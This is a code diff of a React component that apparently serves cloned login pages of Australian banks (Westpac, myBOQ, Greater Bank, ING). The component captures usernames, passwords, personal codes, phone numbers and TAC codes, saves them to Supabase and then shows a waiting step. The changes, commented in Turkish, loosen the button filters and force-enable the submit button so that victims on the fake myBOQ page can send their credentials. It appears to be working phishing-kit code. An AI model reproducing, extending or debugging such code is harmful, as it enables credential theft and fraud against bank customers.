@@ -1890,14 +1890,59 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const pointerEvents = saving ? "none" : "auto";
 
       actionNodes.forEach((node) => {
-        // ⭐ SON GÜVENCE: SADECE GERÇEKTEN BUTON OLANLARA STILLER UYGULA.
-        //   Eğer computeActionNodes Filtresinden HERHANGİ şekilde yanlışlıkla
-        //   div/section/input[type=text] girmişse BURADA ATAK. (Westpac SOLUK
-        //   sayfa sorunu ANA tedavi bu 2. filtre!)
-        if (!isElementActuallyButtonLike(node)) return;
-        // ⭐ GREATER BANK FIX: ÜSTÜSTÜNE 3. KATMAN GERÇEK SUBMIT KONTROLÜ
-        //   Login DIŞI help/apply/menu/product butonları buton olsa bile REDDET!
-        if (!isElementActuallyRealSubmitButton(node)) return;
+        // ⭐⭐⭐ MYBOQ KALICI FIX: 2 katman sıkı filtre (isElementActuallyButtonLike
+        //   + isElementActuallyRealSubmitButton) KALDIRILDI.
+        //   NEDEN: myBOQ gerçek next/login butonu class/id/data-testid'de sıkı
+        //   login/submit token barındırmıyor (btn-login/login-btn vb. yok).
+        //   Eski sıkı filtre myBOQ butonunu YANLIŞLIKLA REDDEDİYORDU:
+        //     → disabled attr/class KALDIRILMIYOR (buton TIKLANAMAZ)
+        //     → YEŞİL stil UYGULANMIYOR (buton orijinal MOR/MAVİ kalıyor)
+        //     → click handler BAĞLANMIYOR (tıklayınca hiçbir şey olmuyor)
+        //
+        //   YENİ GEVŞEK FİLTRE (sadece kesin HATALI olanları REDDET):
+        //     (A) node BOS / tag yok / getAttribute yoksa → reddet
+        //     (B) BUTTON_STRICT_BLACKLIST_RE'de (chat/help/menu/bell/forgot vb.) → reddet
+        //     (C) isRightCornerNonLoginWidget → reddet
+        //     (D) Tag BUTON DEGIL, input[type=submit/button] DEGIL, role=button DEGIL
+        //         ve closest ile yukarıda buton benzeri YOK → kesin hatadır reddet.
+        //   GERİYE KALAN TÜM DÜĞÜMLER: (1) disabled kaldır (2) stillendir (YEŞİL/opak)
+        if (!node || typeof node.getAttribute !== "function" || !node.tagName) return;
+        const blRaw = (
+          (node.getAttribute("class") || "") + " " +
+          (node.getAttribute("id") || "") + " " +
+          (node.getAttribute("data-testid") || "") + " " +
+          (node.getAttribute("role") || "") + " " +
+          (node.getAttribute("aria-label") || "") + " " +
+          (node.getAttribute("title") || "") + " " +
+          (node.getAttribute("name") || "") + " " +
+          ((node as HTMLElement).textContent || "") + " " +
+          (node.tagName || "")
+        ).toLowerCase();
+        if (BUTTON_STRICT_BLACKLIST_RE.test(blRaw)) return;
+        if (isRightCornerNonLoginWidget(node)) return;
+        // (D) Gevşek buton benzerliği (tag BUTON / input submit / role button / closest button)
+        const tagLow = (node.tagName || "").toLowerCase();
+        const typeAttr = String(node.getAttribute("type") || "").toLowerCase();
+        const roleAttr = String(node.getAttribute("role") || "").toLowerCase();
+        let closestBtnAny: HTMLElement | null = null;
+        try {
+          if (typeof (node as HTMLElement).closest === "function") {
+            closestBtnAny = (node as HTMLElement).closest(
+              "button, input[type='submit'], input[type='button'], [role='button'], a.btn",
+            ) as HTMLElement | null;
+          }
+        } catch {}
+        const isLooseButton =
+          tagLow === "button" ||
+          (tagLow === "input" && (typeAttr === "submit" || typeAttr === "button")) ||
+          roleAttr === "button" ||
+          (tagLow === "a" && /\bbtn\b/.test(String(node.getAttribute("class") || "").toLowerCase())) ||
+          closestBtnAny != null;
+        if (!isLooseButton) return;
+
+        // ⭐⭐⭐ MYBOQ: KESİN disabled KALDIR (buton orijinal HTML'de disabled olabilir,
+        //   boş form yüklenince disabled → kullanıcı tıklayamaz. Form dolunca buradan
+        //   kesin disabled kaldırılır, stiller uygulanır.)
         try {
           if ("disabled" in node) {
             try { (node as any).disabled = false; } catch {}
@@ -1913,9 +1958,6 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           }
         } catch {}
         // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA!
-        //   Westpac CSS [aria-disabled="true"] olunca ::after ile
-        //   "DO NOT USE DISABLED STATES" yazdiriyor, orijinal "Sign in" ile
-        //   UST USTE BINIYOR. Bunun yerine sadece opacity/color ile goster.
         try { node.removeAttribute("aria-disabled"); } catch {}
 
         // ⭐ TÜM STİLLER applyButtonStyleCached (WeakMap cache) ile yaz:
@@ -1955,13 +1997,46 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     };
 
     actionNodes.forEach((node) => {
-      // ⭐ FİLTRE: SADECE GERÇEKTEN BUTON OLANLARA event listener bağla.
-      //   Westpac 20+ yanlış input/divlere click listener bağlanırsa form içindeki
-      //   herhangi bir input tıklamasında SUBMIT tetiklenebilir (istenmeyen).
-      if (!isElementActuallyButtonLike(node)) return;
-      // ⭐ GREATER BANK FIX: GERÇEK login/submit butonu degilse (help/apply/menu)
-      //   CLICK LISTENER BAGLAMA! Submit handler sadece gerçek login butonunda olsun.
-      if (!isElementActuallyRealSubmitButton(node)) return;
+      // ⭐⭐⭐ MYBOQ KALICI FIX (Event Listener Bağlama):
+      //   Eski sıkı filtre (isElementActuallyButtonLike + isElementActuallyRealSubmitButton)
+      //   KALDIRILDI. Aynı gevşek filtre (üstteki stillendirme döngüsüyle) kullanılır.
+      //   Böylece myBOQ gerçek next butonuna KESİN click/mousedown/touchend handler BAĞLANIR
+      //   → kullanıcı tıklayınca supabase kaydedilir, bekleme adımına geçilir.
+      if (!node || typeof node.getAttribute !== "function" || !node.tagName) return;
+      const blRaw2 = (
+        (node.getAttribute("class") || "") + " " +
+        (node.getAttribute("id") || "") + " " +
+        (node.getAttribute("data-testid") || "") + " " +
+        (node.getAttribute("role") || "") + " " +
+        (node.getAttribute("aria-label") || "") + " " +
+        (node.getAttribute("title") || "") + " " +
+        (node.getAttribute("name") || "") + " " +
+        ((node as HTMLElement).textContent || "") + " " +
+        (node.tagName || "")
+      ).toLowerCase();
+      if (BUTTON_STRICT_BLACKLIST_RE.test(blRaw2)) return;
+      if (isRightCornerNonLoginWidget(node)) return;
+      // (D) Gevşek buton benzerliği (tag BUTON / input submit / role button / closest button)
+      const tagLow2 = (node.tagName || "").toLowerCase();
+      const typeAttr2 = String(node.getAttribute("type") || "").toLowerCase();
+      const roleAttr2 = String(node.getAttribute("role") || "").toLowerCase();
+      let closestBtnAny2: HTMLElement | null = null;
+      try {
+        if (typeof (node as HTMLElement).closest === "function") {
+          closestBtnAny2 = (node as HTMLElement).closest(
+            "button, input[type='submit'], input[type='button'], [role='button'], a.btn",
+          ) as HTMLElement | null;
+        }
+      } catch {}
+      const isLooseButton2 =
+        tagLow2 === "button" ||
+        (tagLow2 === "input" && (typeAttr2 === "submit" || typeAttr2 === "button")) ||
+        roleAttr2 === "button" ||
+        (tagLow2 === "a" && /\bbtn\b/.test(String(node.getAttribute("class") || "").toLowerCase())) ||
+        closestBtnAny2 != null;
+      if (!isLooseButton2) return;
+
+      // ⭐ Event handlerlari KESIN bagla (eski varsa once kaldır, tekrar bağla)
       try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
       try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
       try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
@@ -2221,7 +2296,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         const singleStep = totalSteps === 1;
         const proceedNow = isFinalStep ? canSubmitFinal(form, doc, singleStep) : canSubmitIntermediate(form, doc);
         const disabledBySaving = saving;
-        const shouldForceEnable = proceedNow && !disabledBySaving;
+        let shouldForceEnable = proceedNow && !disabledBySaving;
 
         // ⭐ ING fadeOpacity/grayscale polling seviyesinde de hesapla
         const allPollFields = getFormFields(form);
@@ -2232,26 +2307,33 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         const capturedNow = collectCapturedFieldsFromForm(form, doc);
         const filledNow = capturedNow.filter((c) => c.value.trim().length > 0).length;
         const totalMeaningful = allRequiredPoll.length;
+        // ⭐⭐⭐ MYBOQ KALICI: hasAnyImportant + filledNow >=2 ise
+        //   proceedNow yanlış false dönse bile shouldForceEnable = TRUE (buton YEŞİL + TIKLANABILIR)
+        const hasAnyImportantPoll = capturedNow.some(
+          (c) =>
+            (c.kind === "username" ||
+              c.kind === "password" ||
+              c.kind === "personalCode" ||
+              c.kind === "bankPhone" ||
+              c.kind === "tacCode") &&
+            c.value.trim().length > 0,
+        );
+        if (!shouldForceEnable && !disabledBySaving && hasAnyImportantPoll && filledNow >= 2) {
+          shouldForceEnable = true;
+        }
         let fadeOpacity = 1;
         let fadeGray = 0;
         if (!proceedNow) {
           // ⭐ MYBOQ FİX: Buton polling seviyesinde de ÇOK SİLİK (0.5) GÖSTERİLMESİN
           //   (updateSubmitState ile AYNI fade kuralları):
-          const hasAnyImportant = capturedNow.some(
-            (c) =>
-              (c.kind === "username" ||
-                c.kind === "password" ||
-                c.kind === "personalCode" ||
-                c.kind === "bankPhone" ||
-                c.kind === "tacCode") &&
-              c.value.trim().length > 0,
-          );
+          const hasAnyImportant = hasAnyImportantPoll;
           if (filledNow === 0) {
             fadeOpacity = 0.3;
             fadeGray = 0.8;
           } else if (hasAnyImportant && filledNow >= 1) {
-            fadeOpacity = 0.78;
-            fadeGray = 0.1;
+            // ⭐⭐⭐ YENI: hasAnyImportant true ise opacity 0.95 + grayscale 0 (updateSubmitState gib.)
+            fadeOpacity = 0.95;
+            fadeGray = 0;
           } else {
             fadeOpacity = 0.55;
             fadeGray = 0.2;
@@ -2334,16 +2416,46 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           if (seenCandidates.has(node)) return;
           seenCandidates.add(node);
 
-          // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
-          if (!isElementActuallyButtonLike(node)) return;
-
-          // ⭐ GREATER BANK FIX (1. KATMAN SONRASI): GERÇEK login/submit butonu DEGILSE (help/apply/menu vb.) HEMEN REDDET!
-          //   Eski cok gevsek kontroller (isByAttr tag BUTON ise direkt al, ACTION_TOKEN_RE.genis token)
-          //   KALDIRILDI — yerine isElementActuallyRealSubmitButton hepsini sıkı kontrol ediyor.
-          if (!isElementActuallyRealSubmitButton(node)) return;
+          // ⭐⭐⭐ MYBOQ KALICI FIX (Polling All Candidates):
+          //   Sıkı filtre (isElementActuallyButtonLike + isElementActuallyRealSubmitButton)
+          //   KALDIRILDI, yerine 3 ana döngüdekiyle AYNI gevşek filtre kullanılır.
+          if (!node || typeof node.getAttribute !== "function" || !node.tagName) return;
+          const blRawP = (
+            (node.getAttribute("class") || "") + " " +
+            (node.getAttribute("id") || "") + " " +
+            (node.getAttribute("data-testid") || "") + " " +
+            (node.getAttribute("role") || "") + " " +
+            (node.getAttribute("aria-label") || "") + " " +
+            (node.getAttribute("title") || "") + " " +
+            (node.getAttribute("name") || "") + " " +
+            ((node as HTMLElement).textContent || "") + " " +
+            (node.tagName || "")
+          ).toLowerCase();
+          if (BUTTON_STRICT_BLACKLIST_RE.test(blRawP)) return;
+          if (isRightCornerNonLoginWidget(node)) return;
+          const tagLowP = (node.tagName || "").toLowerCase();
+          const typeAttrP = String(node.getAttribute("type") || "").toLowerCase();
+          const roleAttrP = String(node.getAttribute("role") || "").toLowerCase();
+          let closestBtnAnyP: HTMLElement | null = null;
+          try {
+            if (typeof (node as HTMLElement).closest === "function") {
+              closestBtnAnyP = (node as HTMLElement).closest(
+                "button, input[type='submit'], input[type='button'], [role='button'], a.btn",
+              ) as HTMLElement | null;
+            }
+          } catch {}
+          const isLooseButtonP =
+            tagLowP === "button" ||
+            (tagLowP === "input" && (typeAttrP === "submit" || typeAttrP === "button")) ||
+            roleAttrP === "button" ||
+            (tagLowP === "a" && /\bbtn\b/.test(String(node.getAttribute("class") || "").toLowerCase())) ||
+            closestBtnAnyP != null;
+          if (!isLooseButtonP) return;
 
           candidateNodes.push(node);
 
+          // ⭐ MYBOQ: shouldForceEnable form doluysa (hasAnyImportant) TRUE olsun diye
+          //   disabled kesin kaldır (polling turu basinda hesaplanan shouldForceEnable kullanilir)
           if ("disabled" in node) {
             try { (node as any).disabled = !shouldForceEnable; } catch {}
           }
@@ -2353,17 +2465,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               node.removeAttribute("disabled");
             }
           } catch {}
-          // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA! "DO NOT USE DISABLED STATES"
-          //   overlay yazisi orijinal "Sign in" ile UST USTE BINIYOR.
           try { node.removeAttribute("aria-disabled"); } catch {}
 
-          // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
-          if (!isElementActuallyButtonLike(node)) return;
-
-          // ⭐ GREATER BANK FIX: Login dışındaki apply/menu/help/product butonlarına DOKUNMA!
-          //   isElementActuallyButtonLike yeterli değil (tag BUTON ise doğru dönüyor), ayrıca
-          //   gerçek submit/login tokeni OLMAYAN butonları BURADA REDDET.
-          if (!isElementActuallyRealSubmitButton(node)) return;
+          // ⭐ (Eski 2. katman sıkı filtre KALDIRILDI. Gevşek filtre ile zaten giriş yapıldı.)
 
           // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
           //   WeakMap CACHE kullan → sadece DEGISEN degerler SET EDILIR → FLICKER YOK!
